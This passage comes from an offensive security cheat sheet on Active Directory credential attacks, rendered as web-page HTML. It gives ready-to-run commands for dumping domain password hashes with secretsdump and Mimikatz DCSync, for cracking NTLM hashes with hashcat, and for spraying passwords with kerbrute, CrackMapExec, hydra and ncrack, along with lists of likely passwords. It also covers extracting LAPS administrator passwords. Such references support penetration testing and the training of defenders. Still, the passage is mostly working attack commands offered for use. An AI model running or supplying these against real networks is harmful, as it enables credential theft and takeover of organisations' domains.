</span></span></code></pre></div><h4 id="extract-hashes-from-ntdsdit">
  Extract hashes from ntds.dit
  <a class="anchor" href="#extract-hashes-from-ntdsdit">#</a>
</h4>
<p>then you need to use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">secretsdump</a> to extract the hashes, use the <code>LOCAL</code> options to use it on a retrieved ntds.dit</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>secretsdump<span style="color:#f92672">.</span><span style="color:#a6e22e">py</span> <span style="color:#f92672">-</span>system <span style="color:#f92672">/</span>root<span style="color:#f92672">/</span>SYSTEM <span style="color:#f92672">-</span>ntds <span style="color:#f92672">/</span>root<span style="color:#f92672">/</span>ntds<span style="color:#f92672">.</span><span style="color:#a6e22e">dit</span> LOCAL
</span></span></code></pre></div><p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">secretsdump</a> also works remotely</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">./</span>secretsdump<span style="color:#f92672">.</span><span style="color:#a6e22e">py</span> <span style="color:#f92672">-</span>dc<span style="color:#f92672">-</span>ip IP AD<span style="color:#960050;background-color:#1e0010">\</span>administrator<span style="color:#a6e22e">@domain</span> <span style="color:#f92672">-</span>use<span style="color:#f92672">-</span>vss <span style="color:#f92672">-</span>pwd<span style="color:#f92672">-</span>last<span style="color:#f92672">-</span>set <span style="color:#f92672">-</span>user<span style="color:#f92672">-</span>status 
</span></span><span style="display:flex;"><span><span style="color:#f92672">./</span>secretsdump<span style="color:#f92672">.</span><span style="color:#a6e22e">py</span> <span style="color:#f92672">-</span>hashes aad3b435b51404eeaad3b435b51404ee<span style="color:#f92672">:</span><span style="color:#ae81ff">0f</span><span style="color:#ae81ff">49</span>aab58dd8fb314e268c4c6a65dfc9 <span style="color:#f92672">-</span>just<span style="color:#f92672">-</span>dc PENTESTLAB<span style="color:#f92672">/</span>dc<span style="color:#960050;background-color:#1e0010">\</span>$<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">10.0.0.1</span>
</span></span></code></pre></div><ul>
<li><code>-pwd-last-set</code>: Shows pwdLastSet attribute for each NTDS.DIT account.</li>
<li><code>-user-status</code>: Display whether or not the user is disabled.</li>
</ul>
<h4 id="alternatives---modules">
  Alternatives - modules
  <a class="anchor" href="#alternatives---modules">#</a>
</h4>
<p>Metasploit modules</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>windows<span style="color:#f92672">/</span>gather<span style="color:#f92672">/</span>credentials<span style="color:#f92672">/</span>domain_hashdump
</span></span></code></pre></div><p>PowerSploit module</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-NinjaCopy --path c:\windows\NTDS\ntds.dit --verbose --localdestination c:\ntds.dit
</span></span></code></pre></div><p>CrackMapExec module</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cme smb <span style="color:#ae81ff">10.10</span>.0.202 -u username -p password --ntds vss
</span></span><span style="display:flex;"><span>cme smb <span style="color:#ae81ff">10.10</span>.0.202 -u username -p password --ntds drsuapi <span style="color:#75715e">#default</span>
</span></span></code></pre></div><h4 id="using-mimikatz-dcsync">
  Using Mimikatz DCSync
  <a class="anchor" href="#using-mimikatz-dcsync">#</a>
</h4>
<p>Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># DCSync only one user</span>
</span></span><span style="display:flex;"><span>mimikatz<span style="color:#75715e"># lsadump::dcsync /domain:htb.local /user:krbtgt</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># DCSync all users of the domain</span>
</span></span><span style="display:flex;"><span>mimikatz<span style="color:#75715e"># lsadump::dcsync /domain:htb.local /all /csv</span>
</span></span></code></pre></div><p>:warning: Read-Only Domain Controllers are not allowed to pull password data for users by default.</p>
<h4 id="using-mimikatz-sekurlsa">
  Using Mimikatz sekurlsa
  <a class="anchor" href="#using-mimikatz-sekurlsa">#</a>
</h4>
<p>Dumps credential data in an Active Directory domain when run on a Domain Controller.
:warning: Requires administrator access with debug or Local SYSTEM rights</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sekurlsa::krbtgt
</span></span><span style="display:flex;"><span>lsadump::lsa /inject /name<span style="color:#960050;background-color:#1e0010">:</span>krbtgt
</span></span></code></pre></div><h4 id="crack-ntlm-hashes-with-hashcat">
  Crack NTLM hashes with hashcat
  <a class="anchor" href="#crack-ntlm-hashes-with-hashcat">#</a>
</h4>
<p>Useful when you want to have the clear text password or when you need to make stats about weak passwords.</p>
<p>Recommended wordlists:</p>
<ul>
<li><a href="https://weakpass.com/wordlist/90">Rockyou.txt</a></li>
<li><a href="https://hashmob.net/hashlists/info/4169-Have%20I%20been%20Pwned%20V8%20%28NTLM%29">Have I Been Pwned founds</a></li>
<li><a href="https://weakpass.com/">Weakpass.com</a></li>
<li>Read More at <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md">Methodology and Resources/Hash Cracking.md</a></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Basic wordlist</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># (-O) will Optimize for 32 characters or less passwords</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># (-w 4) will set the workload to &#34;Insane&#34; </span>
</span></span><span style="display:flex;"><span>$ hashcat64.exe -m <span style="color:#ae81ff">1000</span> -w <span style="color:#ae81ff">4</span> -O -a <span style="color:#ae81ff">0</span> -o pathtopotfile pathtohashes pathtodico -r myrules.rule --opencl-device-types <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Generate a custom mask based on a wordlist</span>
</span></span><span style="display:flex;"><span>$ git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/iphelix/pack/blob/master/README
</span></span><span style="display:flex;"><span>$ python2 statsgen.py ../hashcat.potfile -o hashcat.mask
</span></span><span style="display:flex;"><span>$ python2 maskgen.py hashcat.mask --targettime <span style="color:#ae81ff">3600</span> --optindex -q -o hashcat_1H.hcmask
</span></span></code></pre></div><p>:warning: If the password is not a confidential data (challenges/ctf), you can use online &ldquo;cracker&rdquo; like :</p>
<ul>
<li><a href="https://hashmob.net">hashmob.net</a></li>
<li><a href="https://crackstation.net">crackstation.net</a></li>
<li><a href="https://hashes.com/en/decrypt/hash">hashes.com</a></li>
</ul>
<h3 id="user-hunting">
  User Hunting
  <a class="anchor" href="#user-hunting">#</a>
</h3>
<p>Sometimes you need to find a machine where a specific user is logged in. <br>
You can remotely query every machines on the network to get a list of the users&rsquo;s sessions.</p>
<ul>
<li>CrackMapExec
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>cme smb <span style="color:#ae81ff">10.10</span>.10.<span style="color:#ae81ff">0</span>/<span style="color:#ae81ff">24</span> -u Administrator -p <span style="color:#e6db74">&#39;P@ssw0rd&#39;</span> --sessions
</span></span><span style="display:flex;"><span>SMB         <span style="color:#ae81ff">10.10</span>.10.10    <span style="color:#ae81ff">445</span>    WIN-8OJFTLMU1IG  [+] Enumerated sessions
</span></span><span style="display:flex;"><span>SMB         <span style="color:#ae81ff">10.10</span>.10.10    <span style="color:#ae81ff">445</span>    WIN-8OJFTLMU1IG  \\<span style="color:#ae81ff">10.10</span>.10.10            User<span style="color:#960050;background-color:#1e0010">:</span>Administrator
</span></span></code></pre></div></li>
<li>Impacket Smbclient
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>$ impacket-smbclient Administrator@10.10.10.10
</span></span><span style="display:flex;"><span><span style="color:#75715e"># who</span>
</span></span><span style="display:flex;"><span>host<span style="color:#960050;background-color:#1e0010">:</span>  \\<span style="color:#ae81ff">10.10</span>.10.<span style="color:#ae81ff">10</span>, user<span style="color:#960050;background-color:#1e0010">:</span> Administrator, active<span style="color:#960050;background-color:#1e0010">:</span>     <span style="color:#ae81ff">1</span>, idle<span style="color:#960050;background-color:#1e0010">:</span>     <span style="color:#ae81ff">0</span>
</span></span></code></pre></div></li>
<li>PowerView Invoke-UserHunter
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Find computers were a Domain Admin OR a specified user has a session</span>
</span></span><span style="display:flex;"><span>Invoke-UserHunter
</span></span><span style="display:flex;"><span>Invoke-UserHunter -GroupName <span style="color:#e6db74">&#34;RDPUsers&#34;</span>
</span></span><span style="display:flex;"><span>Invoke-UserHunter -Stealth
</span></span></code></pre></div></li>
</ul>
<h3 id="password-spraying">
  Password spraying
  <a class="anchor" href="#password-spraying">#</a>
</h3>
<p>Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password.</p>
<blockquote>
<p>The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates.</p>
</blockquote>
<p>Most of the time the best passwords to spray are :</p>
<ul>
<li><code>P@ssw0rd01</code>, <code>Password123</code>, <code>Password1</code>, <code>Hello123</code>, <code>mimikatz</code></li>
<li><code>Welcome1</code>/<code>Welcome01</code></li>
<li>$Companyname1 :<code>$Microsoft1</code></li>
<li>SeasonYear : <code>Winter2019*</code>, <code>Spring2020!</code>, <code>Summer2018?</code>, <code>Summer2020</code>, <code>July2020!</code></li>
<li>Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#)</li>
<li>Empty Password (Hash:31d6cfe0d16ae931b73c59d7e0c089c0)</li>
</ul>
<h4 id="kerberos-pre-auth-bruteforcing">
  Kerberos pre-auth bruteforcing
  <a class="anchor" href="#kerberos-pre-auth-bruteforcing">#</a>
</h4>
<p>Using <code>kerbrute</code>, a tool to perform Kerberos pre-auth bruteforcing.</p>
<blockquote>
<p>Kerberos pre-authentication errors are not logged in Active Directory with a normal <strong>Logon failure event (4625)</strong>, but rather with specific logs to <strong>Kerberos pre-authentication failure (4771)</strong>.</p>
</blockquote>
<ul>
<li>Username bruteforce
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>root@kali<span style="color:#960050;background-color:#1e0010">:</span>~$ ./kerbrute_linux_amd64 userenum -d domain.local --dc <span style="color:#ae81ff">10.10</span>.10.10 usernames.txt
</span></span></code></pre></div></li>
<li>Password bruteforce
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>root@kali<span style="color:#960050;background-color:#1e0010">:</span>~$ ./kerbrute_linux_amd64 bruteuser -d domain.local --dc <span style="color:#ae81ff">10.10</span>.10.10 rockyou.txt username
</span></span></code></pre></div></li>
<li>Password spray
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>root@kali<span style="color:#960050;background-color:#1e0010">:</span>~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc <span style="color:#ae81ff">10.10</span>.10.10 domain_users.txt Password123
</span></span><span style="display:flex;"><span>root@kali<span style="color:#960050;background-color:#1e0010">:</span>~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc <span style="color:#ae81ff">10.10</span>.10.10 domain_users.txt rockyou.txt
</span></span><span style="display:flex;"><span>root@kali<span style="color:#960050;background-color:#1e0010">:</span>~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc <span style="color:#ae81ff">10.10</span>.10.10 domain_users.txt <span style="color:#e6db74">&#39;123456&#39;</span> -v --delay <span style="color:#ae81ff">100</span> -o kerbrute-passwordspray-<span style="color:#ae81ff">123456</span>.log
</span></span></code></pre></div></li>
</ul>
<h4 id="spray-a-pre-generated-passwords-list">
  Spray a pre-generated passwords list
  <a class="anchor" href="#spray-a-pre-generated-passwords-list">#</a>
</h4>
<ul>
<li>Using <code>crackmapexec</code> and <code>mp64</code> to generate passwords and spray them against SMB services on the network.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>crackmapexec smb <span style="color:#ae81ff">10.0</span>.0.<span style="color:#ae81ff">1</span>/<span style="color:#ae81ff">24</span> -u Administrator -p `(./mp64.bin Pass@wor<span style="color:#66d9ef">?</span>l<span style="color:#66d9ef">?</span>a)`
</span></span></code></pre></div></li>
<li>Using <code>DomainPasswordSpray</code> to spray a password against all users of a domain.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/dafthack/DomainPasswordSpray</span>
</span></span><span style="display:flex;"><span>Invoke-DomainPasswordSpray -Password Summer2021!
</span></span><span style="display:flex;"><span><span style="color:#75715e"># /!\ be careful with the account lockout !</span>
</span></span><span style="display:flex;"><span>Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
</span></span></code></pre></div></li>
<li>Using <code>SMBAutoBrute</code>.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-SMBAutoBrute -UserList <span style="color:#e6db74">&#34;C:\ProgramData\admins.txt&#34;</span> -PasswordList <span style="color:#e6db74">&#34;Password1, Welcome1, 1qazXDR%+&#34;</span> -LockoutThreshold <span style="color:#ae81ff">5</span> -ShowVerbose
</span></span></code></pre></div></li>
</ul>
<h4 id="spray-passwords-against-the-rdp-service">
  Spray passwords against the RDP service
  <a class="anchor" href="#spray-passwords-against-the-rdp-service">#</a>
</h4>
<ul>
<li>Using <a href="https://github.com/xFreed0m/RDPassSpray">RDPassSpray</a> to target RDP services.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/xFreed0m/RDPassSpray
</span></span><span style="display:flex;"><span>python3 RDPassSpray.py -u [<span style="color:#66d9ef">USERNAME</span>] -p [<span style="color:#66d9ef">PASSWORD</span>] -d [<span style="color:#66d9ef">DOMAIN</span>] -t [<span style="color:#66d9ef">TARGET IP</span>]
</span></span></code></pre></div></li>
<li>Using <a href="https://github.com/vanhauser-thc/thc-hydra">hydra</a> and <a href="https://github.com/nmap/ncrack">ncrack</a> to target RDP services.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>hydra -t <span style="color:#ae81ff">1</span> -V <span style="color:#f92672">-f</span> -l administrator -P /usr/share/wordlists/rockyou.txt rdp<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.10.10
</span></span><span style="display:flex;"><span>ncrack <span style="color:#960050;background-color:#1e0010">–</span>connection-limit <span style="color:#ae81ff">1</span> -vv --user administrator -P password-file.txt rdp<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.10.10
</span></span></code></pre></div></li>
</ul>
<h4 id="badpwdcount-attribute">
  BadPwdCount attribute
  <a class="anchor" href="#badpwdcount-attribute">#</a>
</h4>
<blockquote>
<p>The number of times the user tried to log on to the account using an incorrect password. A value of 0 indicates that the value is unknown.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ crackmapexec ldap <span style="color:#ae81ff">10.0</span>.2.11 -u <span style="color:#e6db74">&#39;username&#39;</span> -p <span style="color:#e6db74">&#39;password&#39;</span> --kdcHost <span style="color:#ae81ff">10.0</span>.2.11 --users
</span></span><span style="display:flex;"><span>LDAP        <span style="color:#ae81ff">10.0</span>.2.11       <span style="color:#ae81ff">389</span>    dc01       Guest      badpwdcount<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">0</span> pwdLastSet<span style="color:#960050;background-color:#1e0010">:</span> &lt;never&gt;
</span></span><span style="display:flex;"><span>LDAP        <span style="color:#ae81ff">10.0</span>.2.11       <span style="color:#ae81ff">389</span>    dc01       krbtgt     badpwdcount<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">0</span> pwdLastSet<span style="color:#960050;background-color:#1e0010">:</span> &lt;never&gt;
</span></span></code></pre></div><h3 id="password-in-ad-user-comment">
  Password in AD User comment
  <a class="anchor" href="#password-in-ad-user-comment">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ crackmapexec ldap domain.lab -u <span style="color:#e6db74">&#39;username&#39;</span> -p <span style="color:#e6db74">&#39;password&#39;</span> -M user-desc
</span></span><span style="display:flex;"><span>$ crackmapexec ldap <span style="color:#ae81ff">10.0</span>.2.11 -u <span style="color:#e6db74">&#39;username&#39;</span> -p <span style="color:#e6db74">&#39;password&#39;</span> --kdcHost <span style="color:#ae81ff">10.0</span>.2.11 -M get-desc-users
</span></span><span style="display:flex;"><span>GET-DESC... <span style="color:#ae81ff">10.0</span>.2.11       <span style="color:#ae81ff">389</span>    dc01    [+] Found following users<span style="color:#960050;background-color:#1e0010">:</span> 
</span></span><span style="display:flex;"><span>GET-DESC... <span style="color:#ae81ff">10.0</span>.2.11       <span style="color:#ae81ff">389</span>    dc01    User<span style="color:#960050;background-color:#1e0010">:</span> Guest description<span style="color:#960050;background-color:#1e0010">:</span> Built-in account <span style="color:#66d9ef">for</span> guest access to the computer/domain
</span></span><span style="display:flex;"><span>GET-DESC... <span style="color:#ae81ff">10.0</span>.2.11       <span style="color:#ae81ff">389</span>    dc01    User<span style="color:#960050;background-color:#1e0010">:</span> krbtgt description<span style="color:#960050;background-color:#1e0010">:</span> Key Distribution Center Service Account
</span></span></code></pre></div><p>There are 3-4 fields that seem to be common in most AD schemas: <code>UserPassword</code>, <code>UnixUserPassword</code>, <code>unicodePwd</code> and <code>msSFU30Password</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>enum4linux | grep -i desc
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Get-WmiObject -Class Win32_UserAccount -Filter <span style="color:#e6db74">&#34;Domain=&#39;COMPANYDOMAIN&#39; AND Disabled=&#39;False&#39;&#34;</span> | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired,PasswordChangeable, Description, SID
</span></span></code></pre></div><p>or dump the Active Directory and <code>grep</code> the content.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ldapdomaindump -u <span style="color:#e6db74">&#39;DOMAIN\john&#39;</span> -p MyP@ssW0rd <span style="color:#ae81ff">10.10</span>.10.10 -o ~/Documents/AD_DUMP/
</span></span></code></pre></div><h3 id="password-of-pre-created-computer-account">
  Password of Pre-Created Computer Account
  <a class="anchor" href="#password-of-pre-created-computer-account">#</a>
</h3>
<p>When <code>Assign this computer account as a pre-Windows 2000 computer</code> checkmark is checked, the password for the computer account becomes the same as the computer account in lowercase. For instance, the computer account <strong>SERVERDEMO$</strong> would have the password <strong>serverdemo</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span><span style="color:#75715e"># Create a machine with default password</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># must be run from a domain joined device connected to the domain</span>
</span></span><span style="display:flex;"><span>djoin /PROVISION /DOMAIN &lt;fqdn&gt; /MACHINE evilpc /SAVEFILE C:\temp\evilpc.txt /DEFPWD /PRINTBLOB /NETBIOS evilpc
</span></span></code></pre></div><ul>
<li>When you attempt to login using the credential you should have the following error code : <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code>.</li>
<li>Then you need to change the password with <a href="https://github.com/SecureAuthCorp/impacket/pull/1304">rpcchangepwd.py</a></li>
</ul>
<h3 id="reading-laps-password">
  Reading LAPS Password
  <a class="anchor" href="#reading-laps-password">#</a>
</h3>
<blockquote>
<p>Use LAPS to automatically manage local administrator passwords on domain joined computers so that passwords are unique on each managed computer, randomly generated, and securely stored in Active Directory infrastructure.</p>
</blockquote>
<h4 id="determine-if-laps-is-installed">
  Determine if LAPS is installed
  <a class="anchor" href="#determine-if-laps-is-installed">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>Get-ChildItem <span style="color:#e6db74">&#39;c:\program files\LAPS\CSE\Admpwd.dll&#39;</span>
</span></span><span style="display:flex;"><span>Get-FileHash <span style="color:#e6db74">&#39;c:\program files\LAPS\CSE\Admpwd.dll&#39;</span>
</span></span><span style="display:flex;"><span>Get-AuthenticodeSignature <span style="color:#e6db74">&#39;c:\program files\LAPS\CSE\Admpwd.dll&#39;</span>
</span></span></code></pre></div><h4 id="extract-laps-password">
  Extract LAPS password
  <a class="anchor" href="#extract-laps-password">#</a>
</h4>
<blockquote>
<p>The &ldquo;ms-mcs-AdmPwd&rdquo; a &ldquo;confidential&rdquo; computer attribute that stores the clear-text LAPS password. Confidential attributes can only be viewed by Domain Admins by default, and unlike other attributes, is not accessible by Authenticated Users</p>
</blockquote>
<ul>
<li>
<p>From Windows:</p>
<ul>
<li>
<p>adsisearcher (native binary on Windows 8+)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>([<span style="color:#66d9ef">adsisearcher</span>]<span style="color:#e6db74">&#34;(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))&#34;</span>).findAll() | ForEach-Object { $_.properties}
</span></span><span style="display:flex;"><span>([<span style="color:#66d9ef">adsisearcher</span>]<span style="color:#e6db74">&#34;(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=MACHINE$))&#34;</span>).findAll() | ForEach-Object { $_.properties}
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/PowerShellEmpire/PowerTools">PowerView</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS &gt; Import-Module .\PowerView.ps1
</span></span><span style="display:flex;"><span>PS &gt; Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/leoloobeek/LAPSToolkit">LAPSToolkit</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ Get-LAPSComputers
</span></span><span style="display:flex;"><span>ComputerName                Password                                 Expiration         
</span></span><span style="display:flex;"><span>------------                --------                                 ----------         
</span></span><span style="display:flex;"><span>example.domain.local        dbZu7;vGaI)Y6w1L                         <span style="color:#ae81ff">02</span>/<span style="color:#ae81ff">21</span>/<span style="color:#ae81ff">2021</span> <span style="color:#ae81ff">22</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">29</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">18</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ Find-LAPSDelegatedGroups
</span></span><span style="display:flex;"><span>$ Find-AdmPwdExtendedRights
</span></span></code></pre></div></li>
<li>
<p>Powershell AdmPwd.PS</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($objResult <span style="color:#66d9ef">in</span> $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name <span style="color:#f92672">-ne</span> $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
</span></span></code></pre></div></li>
</ul>
</li>
<li>
<p>From Linux:</p>
<ul>
<li>
<p><a href="https://github.com/p0dalirius/pyLAPS">pyLAPS</a> to <strong>read</strong> and <strong>write</strong> LAPS passwords:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Read the password of all computers</span>
</span></span><span style="display:flex;"><span>./pyLAPS.py --action get -u <span style="color:#e6db74">&#39;Administrator&#39;</span> -d <span style="color:#e6db74">&#39;LAB.local&#39;</span> -p <span style="color:#e6db74">&#39;Admin123!&#39;</span> --dc-ip 192.168.2.1
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Write a random password to a specific computer</span>
</span></span><span style="display:flex;"><span>./pyLAPS.py --action set --computer <span style="color:#e6db74">&#39;PC01$&#39;</span> -u <span style="color:#e6db74">&#39;Administrator&#39;</span> -d <span style="color:#e6db74">&#39;LAB.local&#39;</span> -p <span style="color:#e6db74">&#39;Admin123!&#39;</span> --dc-ip 192.168.2.1
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 10.10.10.10 -u <span style="color:#e6db74">&#39;user&#39;</span> -H <span style="color:#e6db74">&#39;8846f7eaee8fb117ad06bdd830b7586c&#39;</span> -M laps
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/n00py/LAPSDumper">LAPSDumper</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python laps.py -u <span style="color:#e6db74">&#39;user&#39;</span> -p <span style="color:#e6db74">&#39;password&#39;</span> -d <span style="color:#e6db74">&#39;domain.local&#39;</span>
</span></span><span style="display:flex;"><span>python laps.py -u <span style="color:#e6db74">&#39;user&#39;</span> -p <span style="color:#e6db74">&#39;e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c&#39;</span> -d <span style="color:#e6db74">&#39;domain.local&#39;</span> -l <span style="color:#e6db74">&#39;dc01.domain.local&#39;</span>
</span></span></code></pre></div></li>
<li>
<p>ldapsearch</p>
